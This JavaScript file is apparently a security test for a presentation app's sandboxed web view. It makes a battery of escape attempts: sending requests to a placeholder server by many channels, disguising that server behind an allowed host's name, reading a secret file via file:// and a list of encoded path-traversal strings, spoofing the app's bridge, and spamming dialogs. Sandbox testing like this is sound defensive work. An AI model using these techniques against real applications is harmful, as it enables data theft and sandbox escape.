// The hostile deck's attacks. See hostile.html for the placeholders.
// Written without the built-ins the page poisoned (Array.map, JSON, …).
(function () {
  'use strict';
  const H = window.__hostile;
  const SERVER = '__SERVER__';
  const SECRET = '__SECRET__';
  const TOKEN = '__TOKEN__';
  const ALLOWED = '__ALLOWED__';
  const list = H.byId('hostile-results');
  let pending = 0;

  function record(name, outcome, detail) {
    const item = H.create('li');
    H.setAttr.call(item, 'data-attempt', name);
    H.setAttr.call(item, 'data-outcome', outcome);
    item.textContent = name + ': ' + outcome + (detail ? ' (' + detail + ')' : '');
    H.append.call(list, item);
  }

  /** Runs an attempt that settles itself. `leak()` / `block()` decide it; silence = blocked. */
  function attempt(name, run, timeoutMs) {
    pending += 1;
    let done = false;
    const finish = (outcome, detail) => {
      if (done) return;
      done = true;
      pending -= 1;
      record(name, outcome, detail);
    };
    setTimeout(() => finish('blocked', 'no response'), timeoutMs || 4000);
    try {
      run(() => finish('LEAKED'), (why) => finish('blocked', why), finish);
    } catch (error) {
      finish('blocked', 'threw ' + (error && error.name));
    }
  }

  const leakedIfSecret = (leak, block) => (text) => (String(text).includes(TOKEN) ? leak() : block('no secret'));

  // ---- Network: the server counts hits; the page reports what it saw. ----
  attempt('fetch', (leak, block) => fetch(SERVER + '/fetch').then(leak, () => block('rejected')));
  attempt('fetch keepalive no-cors', (leak, block) =>
    fetch(SERVER + '/keepalive', { mode: 'no-cors', keepalive: true, method: 'POST', body: 'x' }).then(leak, () => block('rejected')));
  attempt('XMLHttpRequest', (leak, block) => {
    const xhr = new XMLHttpRequest();
    xhr.onload = leak;
    xhr.onerror = () => block('error');
    xhr.open('GET', SERVER + '/xhr');
    xhr.send();
  });
  attempt('WebSocket', (leak, block) => {
    const socket = new WebSocket(SERVER.replace('http', 'ws') + '/ws');
    socket.onopen = leak;
    socket.onerror = () => block('error');
  });
  attempt('EventSource', (leak, block) => {
    const source = new EventSource(SERVER + '/events');
    source.onopen = leak;
    source.onerror = () => { source.close(); block('error'); };
  });
  // The allowed host as userinfo in front of the server's: the request goes to the server.
  const disguised = (path) => ALLOWED + ':x@' + SERVER.split('//')[1] + path;
  attempt('img via allowed-host userinfo', (leak, block) => {
    const image = new Image();
    image.onload = leak;
    image.onerror = () => block('error');
    image.src = disguised('/userinfo.png');
  });
  attempt('XHR via allowed-host userinfo', (leak, block) => {
    const xhr = new XMLHttpRequest();
    xhr.onload = leak;
    xhr.onerror = () => block('error');
    xhr.open('GET', disguised('/userinfo-xhr'));
    xhr.send();
  });
  attempt('sendBeacon', (leak, block, finish) =>
    finish('observed-by-test', 'returned ' + navigator.sendBeacon(SERVER + '/beacon', 'x')));
  attempt('img (script-created)', (leak, block) => {
    const image = new Image();
    image.onload = leak;
    image.onerror = () => block('error');
    image.src = SERVER + '/script-img.png';
  });
  attempt('img (markup)', (leak, block) => {
    const image = H.byId('markup-img');
    if (image.complete) return image.naturalWidth > 0 ? leak() : block('error');
    image.onload = leak;
    image.onerror = () => block('error');
  });
  attempt('link stylesheet', (leak, block) => {
    const link = H.create('link');
    link.rel = 'stylesheet';
    link.onload = leak;
    link.onerror = () => block('error');
    link.href = SERVER + '/script.css';
    H.append.call(document.head, link);
  });
  attempt('script src', (leak, block) => {
    const script = H.create('script');
    script.onload = leak;
    script.onerror = () => block('error');
    script.src = SERVER + '/script.js';
    H.append.call(document.head, script);
  });
  attempt('dynamic import()', (leak, block) => import(SERVER + '/module.js').then(leak, () => block('rejected')));
  attempt('CSS @import, @font-face, url()', (leak, block, finish) =>
    document.fonts.load('16px Hostile').then(
      (faces) => (faces.length ? leak() : finish('observed-by-test')),
      () => finish('observed-by-test')));
  attempt('worker fetch', (leak, block) => {
    const code = "fetch('" + SERVER + "/worker').then(() => postMessage('leak'), () => postMessage('block'))";
    const worker = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
    worker.onmessage = (event) => (event.data === 'leak' ? leak() : block('rejected in worker'));
    worker.onerror = () => block('worker refused');
  });
  attempt('a[ping]', (leak, block, finish) => {
    H.byId('ping-link').click();
    finish('observed-by-test');
  });
  attempt('WebRTC (main frame)', (leak, block) => {
    if (typeof window.RTCPeerConnection !== 'function') return block('RTCPeerConnection removed');
    leak();
  });
  attempt('WebRTC (fresh iframe globals)', (leak, block) => {
    const frame = H.create('iframe');
    H.append.call(document.body, frame);
    const Peer = frame.contentWindow && frame.contentWindow.RTCPeerConnection;
    if (typeof Peer !== 'function') return block('not available in iframe either');
    const port = SERVER.split(':')[2];
    const peer = new Peer({ iceServers: [{ urls: 'turn:127.0.0.1:' + port + '?transport=tcp', username: 'u', credential: 'p' }] });
    peer.createDataChannel('x');
    peer.createOffer().then((offer) => peer.setLocalDescription(offer));
    leak(); // Constructing it at all is a gap; the server shows whether it connected.
  });

  // ---- The Mac's files. ----
  attempt('fetch file://', (leak, block) =>
    fetch('file://' + SECRET).then((r) => r.text()).then(leakedIfSecret(leak, block), () => block('rejected')));
  attempt('XHR file://', (leak, block) => {
    const xhr = new XMLHttpRequest();
    xhr.onload = () => leakedIfSecret(leak, block)(xhr.responseText);
    xhr.onerror = () => block('error');
    xhr.open('GET', 'file://' + SECRET);
    xhr.send();
  });
  attempt('img file://', (leak, block) => {
    const image = new Image();
    image.onload = leak;
    image.onerror = () => block('error');
    image.src = 'file://' + SECRET.replace('secret.txt', 'secret.png');
  });
  attempt('iframe file://', (leak, block) => {
    const frame = H.create('iframe');
    frame.onload = () => {
      try {
        leakedIfSecret(leak, block)(frame.contentDocument ? frame.contentDocument.documentElement.textContent : '');
      } catch (error) {
        block('cross-origin');
      }
    };
    frame.src = 'file://' + SECRET;
    H.append.call(document.body, frame);
  });

  // ---- Leaving the deck folder through Cue's own scheme. ----
  const escapes = [
    '../secret.txt', '/../secret.txt', '%2e%2e/secret.txt', '..%2fsecret.txt', '%2e%2e%2fsecret.txt',
    '%252e%252e%252fsecret.txt', 'cue-deck://deck/%2e%2e/secret.txt', 'cue-deck://other/secret.txt',
    'cue-deck://deck/' + SECRET, 'cue-deck://deck//' + SECRET, 'link-to-secret.txt', 'cue-deck://deck/.%2e/secret.txt',
  ];
  for (let i = 0; i < escapes.length; i += 1) {
    const path = escapes[i];
    attempt('folder escape ' + path, (leak, block) =>
      fetch(path).then((r) => r.text()).then(leakedIfSecret(leak, block), () => block('rejected')));
  }
  attempt('control: file inside the folder', (leak, block, finish) =>
    fetch('inside.txt').then((r) => r.text()).then((text) =>
      (text.includes('INSIDE') ? finish('control-ok') : block('inside file unreadable')), () => block('rejected')));

  // ---- Windows, downloads, permissions. ----
  attempt('window.open remote', (leak, block) => (window.open(SERVER + '/popup') ? leak() : block('null')));
  attempt('window.open blank', (leak, block) => (window.open('about:blank') ? leak() : block('null')));
  attempt('download a[download]', (leak, block, finish) => {
    const link = H.create('a');
    link.href = URL.createObjectURL(new Blob(['x'], { type: 'application/octet-stream' }));
    link.download = 'payload.bin';
    H.append.call(document.body, link);
    link.click();
    finish('observed-by-test');
  });
  attempt('getUserMedia', (leak, block) => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return block('API absent');
    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(leak, () => block('rejected'));
  });
  attempt('geolocation', (leak, block) => {
    if (!navigator.geolocation) return block('API absent');
    navigator.geolocation.getCurrentPosition(leak, () => block('denied'));
  });
  attempt('Notification.requestPermission', (leak, block) => {
    if (typeof Notification === 'undefined') return block('API absent');
    Promise.resolve(Notification.requestPermission()).then((p) => (p === 'granted' ? leak() : block(p)), () => block('rejected'));
  });
  attempt('clipboard.readText', (leak, block) => {
    if (!navigator.clipboard || !navigator.clipboard.readText) return block('API absent');
    navigator.clipboard.readText().then(leak, () => block('rejected'));
  });
  attempt('requestFullscreen', (leak, block) => {
    const el = document.documentElement;
    if (!el.requestFullscreen) return block('API absent');
    el.requestFullscreen().then(leak, () => block('rejected'));
  });
  attempt('requestPointerLock', (leak, block) => {
    if (!document.body.requestPointerLock) return block('API absent');
    try { document.body.requestPointerLock(); } catch (e) { return block('threw'); }
    setTimeout(() => (document.pointerLockElement ? leak() : block('not locked')), 800);
  });
  attempt('serviceWorker.register', (leak, block) => {
    if (!navigator.serviceWorker) return block('API absent');
    navigator.serviceWorker.register('sw.js').then(leak, () => block('rejected'));
  });

  // ---- Cue's bridge. ----
  attempt('find window.__cue', (leak, block) => (typeof window.__cue !== 'undefined' ? leak() : block('absent')));
  attempt('call Cue handler', (leak, block) => {
    const handler = H.realWebkit && H.realWebkit.messageHandlers && H.realWebkit.messageHandlers.cue;
    if (!handler) return block('no handler in page world');
    handler.postMessage({ type: 'ready', slideCount: 99 });
    leak();
  });
  attempt('spoof bridge via postMessage', (leak, block, finish) => {
    window.postMessage({ type: 'show', position: { slide: 2, build: 0 }, finished: true }, '*');
    window.postMessage({ type: 'appifact-embed:ready' }, '*');
    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowRight', bubbles: true }));
    finish('observed-by-test');
  });

  // ---- Freezing the show. ----
  // A dialog that really opened would wait for a person, forever. So a call
  // that takes many seconds means it blocked. A busy main thread (other test
  // suites parsing a big deck) can delay a round trip by a second or two, so
  // the limit is generous and the total time isn't checked.
  attempt('dialog spam', (leak, block) => {
    let answers = 0;
    let slowest = 0;
    const timed = (call) => {
      const start = Date.now();
      const result = call();
      slowest = Math.max(slowest, Date.now() - start);
      return result;
    };
    for (let i = 0; i < 100; i += 1) {
      timed(() => alert('spam'));
      if (timed(() => confirm('ok?'))) answers += 1;
      if (timed(() => prompt('name?')) !== null) answers += 1;
    }
    return slowest < 10000 && answers === 0 ? block('returned at once') : leak();
  });
  attempt('busy loop 1.5 s', (leak, block) => {
    const until = Date.now() + 1500;
    while (Date.now() < until) { /* spin */ }
    block('page recovered');
  });

  // ---- Last: try to navigate the top frame away. Results stay only if all fail. ----
  function navigateAway() {
    const targets = [
      () => { window.location.href = SERVER + '/navigated'; },
      () => { window.top.location = 'file://' + SECRET; },
      () => { window.location = URL.createObjectURL(new Blob(['<h1>gone</h1>'], { type: 'text/html' })); },
      () => { window.location = 'data:text/html,<h1>gone</h1>'; },
      () => { window.location = 'cue-deck://deck/inside.txt'; },
      () => {
        const meta = H.create('meta');
        H.setAttr.call(meta, 'http-equiv', 'refresh');
        H.setAttr.call(meta, 'content', '0;url=' + SERVER + '/refresh');
        H.append.call(document.head, meta);
      },
      () => {
        const form = H.create('form');
        form.method = 'POST';
        form.action = SERVER + '/form';
        H.append.call(document.body, form);
        form.submit();
      },
    ];
    let i = 0;
    const next = () => {
      if (i >= targets.length) {
        setTimeout(() => H.setAttr.call(document.body, 'data-hostile-done', '1'), 1000);
        return;
      }
      try { targets[i](); } catch (e) { /* Refused synchronously: fine. */ }
      i += 1;
      setTimeout(next, 250);
    };
    next();
  }
  const waitForAttempts = () => (pending > 0 ? setTimeout(waitForAttempts, 100) : navigateAway());
  setTimeout(waitForAttempts, 200);
})();
